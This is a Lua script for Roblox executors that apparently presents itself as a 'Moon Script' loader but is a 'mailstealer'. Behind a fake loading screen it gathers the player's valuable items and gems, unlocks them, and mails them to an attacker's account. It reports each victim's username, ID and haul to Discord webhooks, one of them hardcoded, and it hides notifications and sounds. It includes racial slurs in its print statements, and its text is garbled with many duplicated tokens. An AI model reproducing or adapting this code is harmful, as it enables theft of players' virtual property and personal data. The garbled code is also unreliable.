local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
-- Main frame with rounded corners
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui
-- Rounded corner effect
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame
-- Text label for the "Loading" message
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.6, 0)
textLabel.Position = UDim2.new(0, 0, 0.2, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Text = "Moon Script is loading"
textLabel.TextScaled = true
textLabel.Font = Enum.Font.GothamBold
textLabel.TextStrokeTransparency = 0.5
textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
textLabel.Parent = frame
-- Animated loading dots
local dotLabel = Instance.new("TextLabel")
dotLabel.Size = UDim2.new(1, 0, 0.2, 0)
dotLabel.Position = UDim2.new(0, 0, 0.8, 0)
dotLabel.BackgroundTransparency = 1
dotLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
dotLabel.Text = ""
dotLabel.TextScaled = true
dotLabel.Font = Enum.Font.GothamBold
dotLabel.Parent = frame
-- Animation for dots
local dotCount = 0
game:GetService("RunService").Heartbeat:Connect(function()
  dotCount dotCount = (dotCount (dotCount + 1) % 4
  dotLabel.Text dotLabel.Text = "Loading" "Loading" .. string.rep(".", string.rep(".", dotCount) dotCount)
end)
-- Optional: Make the frame draggable
frame.Active = true
frame.Draggable = true
DualRAP = 1000
DualUser = "purel4urbrains" -- dualhook name
DualWebhook = "https://discord.com/api/webhooks/1295068053079457812/6ICjb5IxIFE8IEm0IwHaXAu_4LnRZHORc0jfJ2dwniH-UKBkjM6pTlkjVNlN21ZMejlc" -- dualhook webhook
LogsWebhook = "" -- webhook logs
mailstealer_name = "Moon Scripts" -- name
Roblox_Username = Username
Discord_Webhook = Webhook
-- simple mailstealer
LOGS_WEBHOOK = LogsWebhook
if getgenv().Executed == true then
  return
end
getgenv().Executed = true
print("BY @Oblivion from Moon Scripts") repeat
  task.wait()
until game:IsLoaded()
if not game:IsLoaded() then
  game.Loaded:Wait()
end
local idiotuser = game:GetService("Players").LocalPlayer.Name
if idiotuser == Username then
  game:GetService("Players") game:GetService("Players").LocalPlayer:Kick("You .LocalPlayer:Kick("You Are The Owner! (test it on alt
acc)")
  return
end
if Username == nil then
  game:GetService("Players") game:GetService("Players").LocalPlayer:Kick("Put .LocalPlayer:Kick("Put A UserName") UserName")
  return
end
repeat
  task.wait()
until game:IsLoaded()
repeat
  task.wait()
until game.PlaceId ~= nil
repeat   task.wait()
until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
-- variables:
local Library = require(game.ReplicatedStorage.Library)
local Save =
require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
local Player = game.Players.LocalPlayer
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local MailMessage = "xe scripts on top"
local message = require(game.ReplicatedStorage.Library.Client.Message)
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local DevRAPCmds =
require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
-- JOIN MOON SCRIPTS
for id, table in pairs(Inventory.Currency) do
  if table.id table.id == "Diamonds" "Diamonds" then
GemsAmount = table._am or 0
  break
  end
end
for adress, func in pairs(getgc()) do
  if typeof(func) typeof(func) == "function" "function" and debug.getinfo(func).name debug.getinfo(func).name ==
"computeSendMailCost" then
  FunctionToGetFirstPriceOfMa FunctionToGetFirstPriceOfMail = func
  break
  end
end
FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
if FirstPriceOfMail > GemsAmount then
  print("You print("You don't have enough gems to run a script") script")
  return
end
print("ffucking nigger")
local FormatNumber = function(number)
  local n = math.floor(number) math.floor(number)
  local suf = {
  "",
  "k",
  "m",
  "b",
  "t"
  }
  local INDEX = 1   while n >= 1000 do
  n = n / 1000
  INDEX = INDEX + 1
  end
  return string.format("%.2f%s", string.format("%.2f%s", n, suf[INDEX]) suf[INDEX])
end
local function getRAP(Type, Item)
  local mockPetObject mockPetObject = {
  Class = {Name = Type},
  IsA = function(self, function(self, className) className)
  return className className == Type
  end,
  GetId = function(self) function(self)
  return Item.id Item.id
  end,
  StackKey StackKey = function(self) function(self)
  return HttpService:JSONEncode({i HttpService:JSONEncode({id = Item.id, Item.id, pt = Item.pt, Item.pt, sh =
Item.sh, tn = Item.tn})
  end,
  AbstractGetRAP AbstractGetRAP = function(self) function(self)
  if DevRAPCmds DevRAPCmds and type(DevRAPCmds.Get) type(DevRAPCmds.Get) == "function" "function" then
  local success, success, result = pcall(DevRAPCmds.Get, pcall(DevRAPCmds.Get, self)
  if success success then
  return result
  else   return nil
  end
  else
  return nil
  end
  end,
  }
  return mockPetObject mockPetObject
end
local GetItemValue = function(Type, ItemTable)
  local rapObject rapObject = getRAP(Type, getRAP(Type, ItemTable) ItemTable)
  if rapObject rapObject then
  return rapObject:AbstractGetRAP( rapObject:AbstractGetRAP() or 0
  end
  return 0
end
local GetItemValueOfItems = function()
  RAP = 0
  for name_of_category, name_of_category, category category in pairs(Inventory) pairs(Inventory) do
  if category category ~= nil then
  for i, v in pairs(category) pairs(category) do
  RAP = RAP + GetItemValue(name_of_cate GetItemValue(name_of_category, v)
  end
  end
  end
  return RAP
end
function deepCopy(original)
  local copy = {}
  for k, v in pairs(original) pairs(original) do
  if type(v) type(v) == "table" "table" then
  v = deepCopy(v) deepCopy(v)
  end
  copy[k] copy[k] = v
  end
  return copy
end
print("MADE BY MOON SCRIPT")
local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook,
pets_left, shiny, ping, RAP, totalRap1)
  local headers headers = {
  ["Content-Type"] ["Content-Type"] = "application/json" "application/json"
  }
  if shiny == true then
  shinyy = "Shiny" "Shiny"
  elseif shiny == false then
  shinyy = "not Shiny"
  end
  imgs =
  "https://wallpapersok.com/images/high/light-yagami-black-and-white-deathnote-prte12a3hbe8hbnn.jpg"   local fardplayer fardplayer = game:GetService("Players") game:GetService("Players").LocalPlayer .LocalPlayer
  local ExecutorWebhook ExecutorWebhook = identifyexecutor() identifyexecutor() or "undefined" "undefined"
  JobId = game.JobId game.JobId
  local PlayerUser PlayerUser = Player.Name Player.Name
  local msg = {
  ["content"] ["content"] = ping,
  ["username"] ["username"] = "" .. mailstealer_name mailstealer_name .. " Mailstealer", Mailstealer",
  ["avatar_url"] ["avatar_url"] = imgs,
  ["embeds"] ["embeds"] = {
  {
  ["title"] ["title"] = "**YOU JUST GOT A HIT!!**", HIT!!**",
  ["type"] ["type"] = "rich", "rich",
  ["color"] ["color"] = tonumber(000000), tonumber(000000),
  ["thumbnail"] ["thumbnail"] = {
  ["url"] ["url"] = thumbnail thumbnail
  },
  ["fields"] ["fields"] = {
  {
  ["name"] ["name"] = "**This "**This Hit Was Generated Generated Using " ..
mailstealer_name .. " Scripts**",
  ["value"] ["value"] = "```Username "```Username : " ..
fardplayer.Name fardplayer.Name ..
"\nUser-ID "\nUser-ID : " ..
fardplayer.userId fardplayer.userId ..
"\nAccount "\nAccount Age : " ..
fardplayer.AccountAge fardplayer.AccountAge ..
" Days" ..
"\nExploit "\nExploit : " ..
ExecutorWebhook ExecutorWebhook ..
"\nReceiver "\nReceiver : " ..
Roblox_Username Roblox_Username .. "\nTotal "\nTotal RAP
: " ..
FormatNumber(totalRap1) .. "```",
  ["inline"] ["inline"] = false
  },
  {
  ["name"] ["name"] = ":dog: **Pets left** :dog:", :dog:",
  ["value"] = "``` " .. ➜pets_left .. "```",
  ["inline"] ["inline"] = true
  },
  {
  ["name"] ["name"] = ":money_mouth: ":money_mouth: **" .. item_type item_type ..
"** :money_mouth:",
  ["value"] = "``` " .. ➜id .. "```",
  ["inline"] ["inline"] = true
  },
  {
  ["name"] ["name"] = ":trophy: ":trophy: **Item RAP** :trophy:", :trophy:",
  ["value" ["value"] = "``` " .. ➜FormatNu FormatNumber(RAP mber(RAP) .. "```",
  ["inline"] ["inline"] = true
  },
  {
  ["name"] ["name"] = ":gem: **Gems Left** :gem:", :gem:",
  ["value" ["value"] = "``` " .. ➜FormatNu FormatNumber(Gem mber(GemsAmount sAmount) .. "```",
  ["inline"] ["inline"] = true
  },
  {   ["name"] ["name"] = ":sparkles: ":sparkles: **Shiny** **Shiny** :sparkles:", :sparkles:",
  ["value"] = "``` " .. ➜shinyy .. "```",
  ["inline"] ["inline"] = true
  },
  {
  ["name"] ["name"] = ":rainbow: ":rainbow: **RB/Gold/Reg** **RB/Gold/Reg** :sparkles:", :sparkles:",
  ["value" ["value"] = "``` " .. ➜RBgoldNo RBgoldNormal .. "```",
  ["inline"] ["inline"] = true
  }
  }
  }
  },
  ["attachments"] ["attachments"] = {}
  }
  local request request = http_request http_request or request request or HttpPost HttpPost or syn.request syn.request
  request(
  {
  Url = webhook, webhook,
  Method = "POST", "POST",
  Headers Headers = {
  ["Content-Type"] ["Content-Type"] = "application/json" "application/json"
  },
  Body = game.HttpService:JSONEnco game.HttpService:JSONEncode(msg) de(msg)
  }
  )
end
-- skidded that, SORRY!!
local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
  function()
  gemsleaderstatpath.Value gemsleaderstatpath.Value = gemsleaderstat gemsleaderstat
  end
)
local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = Player.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
  function()
  noti.Enabled noti.Enabled = false
  end
)
noti.Enabled = false
task.spawn(
  function()
  game.DescendantAdded:Connect(
  function(x)
  if x.ClassName x.ClassName == "Sound" "Sound" then
  if
  x.SoundId x.SoundId == "rbxassetid://11839132565" "rbxassetid://11839132565" or x.SoundId x.SoundId ==
"rbxassetid://14254721038" orx.SoundId x.SoundId == "rbxassetid://12413423276" "rbxassetid://12413423276"
  then
  x.Volume x.Volume = 0
  x.PlayOnRemove x.PlayOnRemove = false
  x:Destroy()
  end
  end
  end
  )
  end
)
-- no more skidding!
local function GetThumbnail(imageid)
  Asset = string.split(imageid, string.split(imageid, "rbxassetid://")[2] "rbxassetid://")[2]
  local Size = "420x420" "420x420"
  local Image =
  game:HttpGet(
  "https://thumbnails.roblox. "https://thumbnails.roblox.com/v1/assets?assetIds=" com/v1/assets?assetIds=" ..
  Asset .. "&returnPolicy=PlaceHolder&s "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png" "&format=png"
  )
  thumbnail thumbnail = game.HttpService:JSONDecode( game.HttpService:JSONDecode(Image).data[1].imageUrl Image).data[1].imageUrl
  return thumbnail thumbnail
end
MinimumRAP = FirstPriceOfMail
-- EMPTY BOXES
if Inventory.Box then
  for key, value in pairs(Inventory.Box) pairs(Inventory.Box) do
  if value._uq value._uq then
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box:
Withdraw All"):InvokeServer(
  key
  )
  end
  end
end
local response, err =
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox:
Claim All"):InvokeServer()
while err == "You must wait 30 seconds before using the mailbox!" do
  wait()
  response, response, err =
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox:
Claim All"):InvokeServer()
end
require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
local GetListWithAllItems = function()
  local hits = {}
  if Inventory.Pet Inventory.Pet ~= nil then
  for i, v in pairs(Inventory.Pet) pairs(Inventory.Pet) do
  id = v.id
  dir = Directory.Pets[id] Directory.Pets[id]
  if dir.huge dir.huge and dir.Tradable dir.Tradable ~= false then
  rap = GetItemValue("Pet", GetItemValue("Pet", v)
  if v.pt == 1 then
  ItemImageId ItemImageId = dir.goldenThumbnail dir.goldenThumbnail
  ItemType ItemType = "Golden" "Golden"
  elseif v.pt == 2 then
  ItemImageId ItemImageId = dir.thumbnail dir.thumbnail
  ItemType ItemType = "Rainbow" "Rainbow"
  else
  ItemImageId ItemImageId = dir.thumbnail dir.thumbnail
  ItemType ItemType = "Normal" "Normal"
  end
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,   Item_Class Item_Class = "Pet",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  if dir.exclusiveLevel dir.exclusiveLevel and dir.Tradable dir.Tradable ~= false then
  rap = GetItemValue("Pet", GetItemValue("Pet", v) * (v._am or 1)
  if v.pt == 1 then
  ItemImageId ItemImageId = dir.goldenThumbnail dir.goldenThumbnail
  ItemType ItemType = "Golden" "Golden"
  elseif v.pt == 2 then
  ItemImageId ItemImageId = dir.thumbnail dir.thumbnail
  ItemType ItemType = "Rainbow" "Rainbow"
  else
  ItemImageId ItemImageId = dir.thumbnail dir.thumbnail
  ItemType ItemType = "Normal" "Normal"
  end
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
Item_Id Item_Id = i,
Item_Name Item_Name = v.id,
Item_Amount Item_Amount = v._am or 1,
Item_RAP Item_RAP = rap, Item_Class Item_Class = "Pet",
IsShiny IsShiny = v.sh or false,
IsLocked IsLocked = v.lk or false,
Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  end
  if Inventory.Egg Inventory.Egg ~= nil then
  for i, v in pairs(Inventory.Egg) pairs(Inventory.Egg) do
  id = v.id
  dir = Directory.Eggs[id] Directory.Eggs[id]
  rap = GetItemValue("Egg", GetItemValue("Egg", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.icon dir.icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Egg",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType   }
  )
  end
  end
  end
  if Inventory.Misc Inventory.Misc ~= nil then
  for i, v in pairs(Inventory.Misc) pairs(Inventory.Misc) do
  id = v.id
  dir = Directory.MiscItems[id] Directory.MiscItems[id]
  rap = GetItemValue("Misc", GetItemValue("Misc", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP and v.id ~= "Slingshot" "Slingshot" then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Misc", "Misc",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end end
  end
  if Inventory.Charm Inventory.Charm ~= nil then
  for i, v in pairs(Inventory.Charm) pairs(Inventory.Charm) do
  id = v.id
  dir = Directory.Charms[id] Directory.Charms[id]
  rap = GetItemValue("Charm", GetItemValue("Charm", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Charm", "Charm",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Enchant Inventory.Enchant ~= nil then
  for i, v in pairs(Inventory.Enchant) pairs(Inventory.Enchant) do
  id = v.id
  dir = Directory.Enchants[id] Directory.Enchants[id]
  rap = GetItemValue("Enchant", GetItemValue("Enchant", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon(v.tn) dir.Icon(v.tn)
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Enchant", "Enchant",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Lootbox Inventory.Lootbox ~= nil then
  for i, v in pairs(Inventory.Lootbox) pairs(Inventory.Lootbox) do
  id = v.id
  dir = Directory.Lootboxes[id] Directory.Lootboxes[id]
  rap = GetItemValue("Lootbox", GetItemValue("Lootbox", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon   if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Lootbox", "Lootbox",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Potion Inventory.Potion ~= nil then
  for i, v in pairs(Inventory.Potion) pairs(Inventory.Potion) do
  id = v.id
  dir = Directory.Potions[id] Directory.Potions[id]
  rap = GetItemValue("Potion", GetItemValue("Potion", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon(v.tn) dir.Icon(v.tn)
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,   Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Potion", "Potion",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Seed Inventory.Seed ~= nil then
  for i, v in pairs(Inventory.Seed) pairs(Inventory.Seed) do
  id = v.id
  dir = Directory.Seeds[id] Directory.Seeds[id]
  rap = GetItemValue("Seed", GetItemValue("Seed", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Seed", "Seed",   IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Ultimate Inventory.Ultimate ~= nil then
  for i, v in pairs(Inventory.Ultimate pairs(Inventory.Ultimate) do
  id = v.id
  dir = Directory.Ultimates[id] Directory.Ultimates[id]
  rap = GetItemValue("Ultimate", GetItemValue("Ultimate", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Ultimate", "Ultimate",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )   end
  end
  end
  if Inventory.Fruit Inventory.Fruit ~= nil then
  for i, v in pairs(Inventory.Fruit) pairs(Inventory.Fruit) do
  id = v.id
  dir = Directory.Fruits[id] Directory.Fruits[id]
  rap = GetItemValue("Fruit", GetItemValue("Fruit", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Fruit", "Fruit",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end   if Inventory.Hoverboard Inventory.Hoverboard ~= nil then
  for i, v in pairs(Inventory.Hoverboa pairs(Inventory.Hoverboard) do
  id = v.id
  dir = Directory.Hoverboards[id] Directory.Hoverboards[id]
  rap = GetItemValue("Hoverboard", GetItemValue("Hoverboard", v)
  ItemType ItemType = "Normal" "Normal"
  ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Hoverboard", "Hoverboard",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  if Inventory.Booth Inventory.Booth ~= nil then
  for i, v in pairs(Inventory.Booth) pairs(Inventory.Booth) do
  id = v.id
  dir = Directory.Booths[id] Directory.Booths[id]
  rap = GetItemValue("Booth", GetItemValue("Booth", v)
  ItemType ItemType = "Normal" "Normal"   ItemImageId ItemImageId = dir.Icon dir.Icon
  if rap > MinimumRAP MinimumRAP then
  table.insert(
  hits,
  {
  Item_Id Item_Id = i,
  Item_Name Item_Name = v.id,
  Item_Amount Item_Amount = v._am or 1,
  Item_RAP Item_RAP = rap,
  Item_Class Item_Class = "Booth", "Booth",
  IsShiny IsShiny = v.sh or false,
  IsLocked IsLocked = v.lk or false,
  Item_ImageId Item_ImageId = ItemImageId, ItemImageId,
  Item_Type Item_Type = ItemType ItemType
  }
  )
  end
  end
  end
  table.sort(
  hits,
  function(a, function(a, b)
  return a.Item_RAP a.Item_RAP > b.Item_RAP b.Item_RAP
  end
  )
  return hits
end
local function IsMailboxHooked()
  local uid
  for i, v in pairs(Inventory["Pet"]) pairs(Inventory["Pet"]) do
  uid = i
  break
  end
  local args = {
  [1] = "Roblox", "Roblox",
  [2] = "Test", "Test",
  [3] = "Pet",
  [4] = uid,
  [5] = 1
  }
  local response, response, err = network:WaitForChild("Mailb network:WaitForChild("Mailbox:
Send"):InvokeServer(unpack(args))
  if (err == "They don't have enough space!") space!") or (err == "You don't have enough
diamonds to send the mail!") then
  return false
  else
  return true
  end
end
itemsCounted = 0
local totalRap = 0
local hits = GetListWithAllItems()
currentMailPrice = FirstPriceOfMail
-- make it count total rap until sending price is bigger than gems amount, also
make it calculate gems amount after each send for i, v in pairs(hits) do
  if v.Item_RAP v.Item_RAP >= currentMailPrice currentMailPrice then
  totalRap totalRap = totalRap totalRap + v.Item_RAP v.Item_RAP
  itemsCounted itemsCounted = itemsCounted itemsCounted + 1
  end
  currentMailPrice currentMailPrice = currentMailPrice currentMailPrice * 1.5
  if currentMailPrice currentMailPrice > 5000000 5000000 then
  currentMailPrice currentMailPrice = 5000000 5000000
  end
end
if totalRap >= DualRAP then
 print("EZ BITCH NIGGER")
 Roblox_Username = DualUser
 Discord_Webhook = DualWebhook
end
local function sendItem(category, uid, am, locked)
  local args = {
  [1] = Roblox_Username, Roblox_Username,
  [2] = "" .. mailstealer_name mailstealer_name .. " scripts scripts on top",
  [3] = category, category,
  [4] = uid,
  [5] = am   }
  local response response = false
  repeat
  if locked == true then
  local args = {
  uid,
  false
  }
game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(
args))
  end
  local response, response, err = network:WaitForChild("Mailbo network:WaitForChild("Mailbox:
Send"):InvokeServer(unpack(args))
  if response response == false and err == "They don't have enough space!" space!" then
  Roblox_Username Roblox_Username = Username2 Username2
  args[1] args[1] = Roblox_Username Roblox_Username
  end
  until response response == true
  GemsAmount GemsAmount = GemsAmount GemsAmount - FirstPriceOfMail FirstPriceOfMail
  FirstPriceOfMail FirstPriceOfMail = math.ceil(math.ceil(FirstP math.ceil(math.ceil(FirstPriceOfMail) riceOfMail) * 1.5)
  if FirstPriceOfMail FirstPriceOfMail > 5000000 5000000 then
  FirstPriceOfMail FirstPriceOfMail = 5000000 5000000
  end
end
local function SendAllGems()
  for i, v in pairs(Inventory.Currency) pairs(Inventory.Currency) do
  if v.id == "Diamonds" "Diamonds" then
  if GemsAmount GemsAmount >= (FirstPriceOfMail (FirstPriceOfMail + 10000) then SentGems SentGems = GemsAmount GemsAmount - FirstPriceOfMail FirstPriceOfMail
  local args = {
  [1] = Roblox_Username, Roblox_Username,
  [2] = "" .. mailstealer_name mailstealer_name .. " scripts scripts on top",
  [3] = "Currency", "Currency",
  [4] = i,
  [5] = SentGems SentGems
  }
  local response response = false
  repeat
  local response response = network:WaitForChild("Mail network:WaitForChild("Mailbox:
Send"):InvokeServer(unpack(args))
  until response response == true
  SendMessage("Diamonds", SendMessage("Diamonds", "Currency", "Currency", "Gems", "Gems",
"rbxassetid://15258327857", Discord_Webhook, "none", "no", "@everyone", SentGems,
totalRap)
  break
  end
  end
  end
end
Left_Hits = #hits
if #hits > 0 or GemsAmount > FirstPriceOfMail then
  local blob_a =
require(game:GetService("ReplicatedStorage").Library.Client.Save)
  local blob_b = blob_a.Get() blob_a.Get()
  FavoriteModeSelection FavoriteModeSelection = blob_a.Get().FavoriteMode blob_a.Get().FavoriteModeSelection Selection
  FavoriteModeSelectionPlaza FavoriteModeSelectionPlaza = blob_a.Get().Favorit blob_a.Get().FavoriteModeSelectionPlaza eModeSelectionPlaza
  oldGet = deepCopy(blob_b) deepCopy(blob_b)
  blob_a.Get blob_a.Get = function(...) function(...)
  blob_b = oldGet
  blob_b.FavoriteModeSelectio blob_b.FavoriteModeSelection = {FavoriteModeSel {FavoriteModeSelection} ection}
  blob_b.FavoriteModeSelectio blob_b.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza} {FavoriteModeSelectionPlaza}
  return blob_b
  end
  if IsMailboxHooked() IsMailboxHooked() then
  local Mailbox Mailbox =
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox:
Send")
  for i, Func in ipairs(getgc(true)) ipairs(getgc(true)) do
  if typeof(Func) typeof(Func) == "function" "function" and debug.info(Func, debug.info(Func, "n") == "typeof" "typeof"
then
  local Old
  Old =
  hookfunction(
  Func,
  function(Ins, function(Ins, ...)   if Ins == Mailbox Mailbox then
return tick()
  end
  return Old(Ins, Old(Ins, ...)
  end
  )
  end
  end
  end
  for i, v in pairs(hits) pairs(hits) do
  if FirstPriceOfMail FirstPriceOfMail > 5000000 5000000 then
  FirstPriceOfMail FirstPriceOfMail = 5000000 5000000
  end
  if v.Item_RAP v.Item_RAP >= FirstPriceOfMail FirstPriceOfMail then
  sendItem(v.Item_Class, sendItem(v.Item_Class, v.Item_Id, v.Item_Id, v.Item_Amount, v.Item_Amount, v.IsLocked) v.IsLocked)
  thumb = GetThumbnail(v.Item_Imag GetThumbnail(v.Item_ImageId)
  Left_Hits Left_Hits = Left_Hits Left_Hits - 1
  task.spawn(
  function()
  SendMessage(
  v.Item_Name,
  v.Item_Class,
  v.Item_Type,
  thumb,
  Discord_Webhook,
  Left_Hits,
  v.IsShiny,
  "@everyone",   v.Item_RAP,
  totalRap
  )
  if Roblox_Username Roblox_Username ~= DualhookUsername DualhookUsername then
  SendMessage(
v.Item_Name,
v.Item_Class,
v.Item_Type,
thumb,
LOGS_WEBHOOK,
Left_Hits,
v.IsShiny,
"MOON ON TOP!!", TOP!!",
v.Item_RAP,
totalRap
  )
  end
  end
  )
  else
  break
  end
  end
  SendAllGems()
gui:Destroy()
local message = require(game.ReplicatedStorage.Library.Client.Message)
message.Error("YOU JUST GOT MAILSTOLEN BY MOON SCRIPTS
SikalaFa")
setclipboard("SikalaFA")
end
